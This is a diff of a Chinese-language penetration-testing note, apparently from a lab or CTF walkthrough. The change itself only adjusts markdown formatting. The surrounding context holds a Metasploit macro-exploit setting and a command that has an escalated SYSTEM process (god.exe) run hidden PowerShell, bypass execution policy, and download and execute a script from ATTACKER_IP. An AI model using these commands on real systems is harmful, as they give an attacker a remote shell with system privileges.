@@ -11,7 +11,6 @@
 ### form Job
 
 <details>
-
 <summary>反shell的区别</summary>
 
 #### PowerShell 反向 shell 文件
@@ -23,9 +22,7 @@ msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -no
 #### 第二条：让“已经提权成功的 SYSTEM 进程（god.exe）”去执行 PowerShell
 ```
 c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
-```
-
-</details>
+</details>```
 
 ————————————————————————————————————
 #### form Support 
